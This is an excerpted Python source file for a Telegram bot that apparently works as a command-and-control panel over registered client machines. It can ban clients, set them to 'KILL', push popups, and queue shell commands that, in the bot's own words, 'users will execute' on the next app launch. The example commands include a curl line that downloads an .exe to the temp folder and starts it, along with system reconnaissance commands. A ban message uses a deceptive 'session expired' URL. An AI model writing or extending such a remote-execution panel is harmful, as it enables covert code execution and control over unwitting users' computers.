...
(
    ...
    WAITING_FOR_REG,
    WAITING_FOR_GRANT,
    WAITING_FOR_BAN_CLIENTS,
    WAITING_FOR_BAN_REASON,
    WAITING_FOR_EXEC_CLIENTS,
    WAITING_FOR_EXEC_TEXT,
    WAITING_FOR_CMD_CLIENTS,      # NEW: CMD username selection
    WAITING_FOR_CMD_TEXT,         # NEW: CMD command input
    WAITING_FOR_DELETE,
...
) = range(19)  # Updated range to include new states
...
def get_stats_sync():
    ...
    safe, banned, kill, cmd, total = 0, 0, 0, 0, 0
    with open(CLIENTS_FILE, "r") as f:
        for line in f:
            if " -> " in line:
                total += 1
    ...
    for line in lines:
        if " -> " in line:
            ...
            if u_part in targets:
                if append_only:
                    # Keep existing status and add the command
...
def main_menu_keyboard():
    keyboard = [
        ...
        [InlineKeyboardButton("💬 Popup Msg", callback_data="m_popup"), InlineKeyboardButton("🔍 Search", callback_data="m_search")],
        [InlineKeyboardButton("📊 Stats", callback_data="m_stats"), InlineKeyboardButton("📢 Broadcast (SAFE)", callback_data="m_broad")],
        [InlineKeyboardButton("🧹 Clear (SAFE)", callback_data="m_clear_broad"), InlineKeyboardButton("📋 Full List", callback_data="m_list")],
        [InlineKeyboardButton("📥 Get Backups", callback_data="m_backup"), InlineKeyboardButton("💀 BAN ALL CLIENTS", callback_data="m_ban_all")],
        [InlineKeyboardButton("↩️ Undo Ban All", callback_data="m_undo_ban"), InlineKeyboardButton("✖️ Close Session", callback_data="m_cancel")]
    ]
...
async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    ...
    if c == "m_reg": 
        await query.edit_message_text("📝 **Registration**\nSend: `KEY USERNAME`", parse_mode="Markdown", reply_markup=cancel_keyboard())
        return WAITING_FOR_REG
    if c == "m_grant": 
        await query.edit_message_text("✅ **Grant SAFE**\nSend Username(s) separated by `-`:", parse_mode="Markdown", reply_markup=cancel_keyboard())
        return WAITING_FOR_GRANT
    if c == "m_ban": 
        await query.edit_message_text("🚫 **Ban System**\n**Step 1:** Send Username(s) separated by `-`:", parse_mode="Markdown", reply_markup=cancel_keyboard())
        return WAITING_FOR_BAN_CLIENTS
    if c == "m_kill": 
        await query.edit_message_text("☠️ **Set KILL**\nSend Username(s) separated by `-`:", parse_mode="Markdown", reply_markup=cancel_keyboard())
        return WAITING_FOR_KILL
    if c == "m_del": 
        await query.edit_message_text("🗑️ **Sync Delete**\nSend Username(s) separated by `-`:", parse_mode="Markdown", reply_markup=cancel_keyboard())
        return WAITING_FOR_DELETE
    if c == "m_rename": 
        await query.edit_message_text("✏️ **Rename**\nSend **current** name:", parse_mode="Markdown", reply_markup=cancel_keyboard())
        return WAITING_FOR_RENAME_OLD
    if c == "m_exec": 
        await query.edit_message_text("⚙️ **Execute (Legacy)**\nStep 1: Send Username(s) separated by `-`:", parse_mode="Markdown", reply_markup=cancel_keyboard())
        return WAITING_FOR_EXEC_CLIENTS
    if c == "m_cmd":  # NEW CMD handler
        ...
        return WAITING_FOR_CMD_CLIENTS
    if c == "m_popup": 
        await query.edit_message_text("💬 **Popup Msg**\nStep 1: Send Username(s) separated by `-`:", parse_mode="Markdown", reply_markup=cancel_keyboard())
        return WAITING_FOR_POP_CLIENTS
    
    if c == "m_stats": 
        await query.edit_message_text(get_stats_sync(), reply_markup=main_menu_keyboard(), parse_mode="Markdown")
        return MENU_HUB
    if c == "m_search": 
        await query.edit_message_text("🔍 **Search**\nEnter keyword:", reply_markup=cancel_keyboard())
        return WAITING_FOR_SEARCH
    if c == "m_broad": 
        await query.edit_message_text("📢 **Broadcast (SAFE Only)**\nEnter popup text:", reply_markup=cancel_keyboard())
        return WAITING_FOR_BROADCAST
    if c == "m_clear_broad":
        count = clear_global_msg_sync()
        await query.edit_message_text(f"🧹 Cleared {count} SAFE users.", reply_markup=main_menu_keyboard())
        return MENU_HUB

    if c == "m_ban_all":
        count = ban_all_users_sync()
        await query.edit_message_text(f"💀 Banned all {count} users.", reply_markup=main_menu_keyboard())
        return MENU_HUB
    if c == "m_undo_ban":
...
async def handle_ban_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    await update.message.reply_text(
        "🚫 **Step 2:** Send the **Ban Reason** to show the user:\n"
        "Example: `https://your-session-has-expired.com`",
        parse_mode="Markdown", 
        reply_markup=cancel_keyboard()
    )
...
async def handle_ban_final(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    targets = context.user_data.get("ban_targets", "")
    count, updated_users = batch_update_users(targets, "BAN", reason)
    
    users_list = "\n".join([f"• `{u}`" for u in updated_users])
    await update.message.reply_text(
        f"🚫 **Ban Complete**\n"
        f"━━━━━━━━━━━━━━\n"
        f"Users: {count}\n"
...
async def handle_search(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(search_user_sync(update.message.text), parse_mode="Markdown")
    return await start(update, context)
...
async def handle_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    await update.message.reply_text(f"📢 Popup broadcast sent to {count} SAFE users.")
    return await start(update, context)
...
async def handle_rename_old(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    await update.message.reply_text("✏️ Send **NEW** username:", reply_markup=cancel_keyboard())
...
async def handle_grant(update: Update, context: ContextTypes.DEFAULT_TYPE):
    count, updated_users = batch_update_users(update.message.text, "SAFE")
    users_list = "\n".join([f"• `{u}`" for u in updated_users])
    await update.message.reply_text(f"✅ **{count} User(s) Granted SAFE**\n{users_list}", parse_mode="Markdown")
    return await start(update, context)

async def handle_kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
    count, updated_users = batch_update_users(update.message.text, "KILL")
    users_list = "\n".join([f"• `{u}`" for u in updated_users])
    await update.message.reply_text(f"☠️ **{count} User(s) Set to KILL**\n{users_list}", parse_mode="Markdown")
    return await start(update, context)

async def handle_delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
    count = delete_sync_users(update.message.text)
    await update.message.reply_text(f"🗑️ Deleted {count} user(s).")
    return await start(update, context)
...
async def handle_exec_final(update: Update, context: ContextTypes.DEFAULT_TYPE):
    count, updated_users = batch_update_users(
    ...
    users_list = "\n".join([f"• `{u}`" for u in updated_users])
    await update.message.reply_text(f"⚙️ Command added to {count} user(s):\n{users_list}", parse_mode="Markdown")
    return await start(update, context)

# NEW: CMD Command Handlers
async def handle_cmd_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Step 1: Store target usernames and ask for the CMD command"""
    context.user_data["cmd_targets"] = update.message.text
    await update.message.reply_text(
        "⚡ **Step 2:** Enter the CMD command to execute:\n\n"
        "📌 **Examples:**\n"
        "• `ipconfig /all`\n"
        "• `curl https://example.com/file.exe -o %TEMP%\\file.exe && start %TEMP%\\file.exe`\n"
        "• `whoami && systeminfo`\n"
        "• `netstat -an | findstr LISTENING`\n"
        "• `powershell -Command \"Get-Process | Select-Object -First 10\"`\n\n"
        "⚠️ The command will be prefixed with `CMD->` in the CLIENTS file.",
        parse_mode="Markdown", 
        reply_markup=cancel_keyboard()
    )
...
async def handle_cmd_final(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Step 2: Write CMD command to users"""
    command = update.message.text.strip()
    targets = context.user_data.get("cmd_targets", "")
    
    # Use batch_update_users with new_status_base="CMD" and the command as extra_text
    count, updated_users = batch_update_users(targets, "CMD", f"CMD-> {command}")
    ...
    await update.message.reply_text(
        ...
        f"📋 **Command:**\n"
        f"```batch\n{command}\n```\n\n"
        f"✅ Users will execute this command on next app launch.",
        parse_mode="Markdown"
    )
    return await start(update, context)
...
async def handle_pop_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    await update.message.reply_text("💬 Send Popup Text:", reply_markup=cancel_keyboard())
    return WAITING_FOR_POP_TEXT
...
async def handle_pop_final(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    users_list = "\n".join([f"• `{u}`" for u in updated_users])
    await update.message.reply_text(f"💬 Popup added to {count} user(s):\n{users_list}", parse_mode="Markdown")
    return await start(update, context)
